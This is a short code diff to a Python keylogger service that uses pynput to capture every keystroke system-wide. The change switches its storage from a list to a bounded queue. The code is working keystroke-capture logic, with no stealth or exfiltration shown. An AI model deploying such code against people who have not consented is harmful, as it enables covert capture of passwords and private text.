@@ -1,18 +1,18 @@
 from pynput import keyboard
-from typing import List
+import queue
 from ikeylogger import IKeyLogger
 
 class KeyLoggerService(IKeyLogger):
-    def __init__(self):
-        self.logged_keys = []
+    def __init__(self, max_queue_size=1000):
+        self.logged_keys = queue.Queue(maxsize=max_queue_size)
         self.listener = None
 
     def start_logging(self):
         def on_press(key):
             try:
-                self.logged_keys.append(key.char)
+                self.logged_keys.put(key.char)
             except AttributeError:
-                self.logged_keys.append(str(key))
+                self.logged_keys.put(str(key))
 
         self.listener = keyboard.Listener(on_press=on_press)
         self.listener.start()
@@ -21,5 +21,8 @@ class KeyLoggerService(IKeyLogger):
         if self.listener:
             self.listener.stop()
 
-    def get_logged_keys(self) -> List[str]:
-        return self.logged_keys
+    def get_logged_keys(self):
+        keys = []
+        while not self.logged_keys.empty():
+            keys.append(self.logged_keys.get())
+        return keys
